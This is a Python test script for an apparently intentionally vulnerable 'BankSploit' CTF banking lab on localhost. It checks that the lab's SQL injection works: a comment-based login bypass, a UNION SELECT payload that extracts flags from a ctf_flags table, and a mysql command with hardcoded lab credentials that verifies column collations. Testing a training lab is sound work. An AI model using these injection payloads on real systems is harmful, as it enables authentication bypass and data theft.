#!/usr/bin/env python
import urllib.request
import urllib.parse
import re
import http.cookiejar
import subprocess

BASE_URL = "http://localhost:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

print("=" * 60)
print("BankSploit SQL Injection Collation Test")
print("=" * 60)

# Step 1: Login with SQLi bypass
print("\n[1] Logging in with SQLi bypass...")
login_data = urllib.parse.urlencode({
    "customer_id": "BS100234'#",
    "password": "anything"
}).encode('utf-8')

try:
    resp = opener.open(f"{BASE_URL}/login", login_data)
    login_text = resp.read().decode('utf-8')
    if "Sign in" not in login_text and resp.status == 200:
        print("[OK] Login successful")
    else:
        print("[!] Login may have failed, continuing anyway...")
except Exception as e:
    print(f"[!] Login error: {e}")

# Step 2: Test the UNION injection
print("\n[2] Testing UNION SQL injection...")
payload = "abc' Union select 'A',username,flag,'D','E','F','G' from ctf_flags#"
params = urllib.parse.urlencode({
    "account_id": 1,
    "from_date": "",
    "to_date": "",
    "q": payload
})
url = f"{BASE_URL}/statements?{params}"

try:
    resp = opener.open(url)
    resp_text = resp.read().decode('utf-8')

    # Check for collation error
    if "1271" in resp_text or "Illegal mix of collations" in resp_text:
        print("[X] COLLATION ERROR FOUND!")
        error_match = re.search(r'ERROR \d+.*', resp_text)
        error_text = error_match.group(0) if error_match else 'Unknown'
        print(f"    Error: {error_text}")
    elif "SQLSTATE" in resp_text and "HY000" in resp_text:
        print("[X] GENERAL ERROR FOUND!")
        error_match = re.search(r'SQLSTATE.*?(?=<|$)', resp_text, re.DOTALL)
        if error_match:
            print(f"    {error_match.group(0)[:100]}")
    else:
        print("[OK] No collation errors!")

        # Look for flag extraction
        if "BANKSPLOIT{" in resp_text:
            flags = re.findall(r'BANKSPLOIT\{[^}]+\}', resp_text)
            print(f"[OK] FLAGS EXTRACTED: {len(flags)} found")
            for flag in flags[:3]:  # Show first 3
                print(f"    {flag}")
        elif "flag" in resp_text.lower():
            print("[OK] Flag data present in response")
        else:
            print("[?] Injection executed but no flag data in response")
            print(f"    Response length: {len(resp_text)} bytes")

except Exception as e:
    print(f"[X] Request error: {e}")

# Step 3: Direct database verification
print("\n[3] Verifying database collation...")
try:
    cmd = [
        "C:\\Program Files\\MySQL\\MySQL Server 8.4\\bin\\mysql.exe",
        "-u", "banksploit",
        "-pbanksploit_pass",
        "-h", "127.0.0.1",
        "--protocol=TCP",
        "banksploit",
        "-e",
        "SELECT COLUMN_NAME, COLLATION_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'ctf_flags';"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)

    if result.returncode == 0:
        lines = result.stdout.split('\n')
        print("[OK] Database collation check:")
        all_correct = True
        for line in lines[1:]:  # Skip header
            if line.strip() and "COLUMN_NAME" not in line:
                print(f"    {line}")
                if "utf8mb4_0900_ai_ci" not in line and "NULL" not in line:
                    all_correct = False

        if all_correct:
            print("\n[OK] ALL COLLATIONS CORRECT (utf8mb4_0900_ai_ci)")
        else:
            print("\n[!] WARNING: Some columns have non-standard collation")
    else:
        print(f"[!] MySQL query failed: {result.stderr}")
except Exception as e:
    print(f"[!] Database check error: {e}")

print("\n" + "=" * 60)
print("Test Complete")
print("=" * 60)
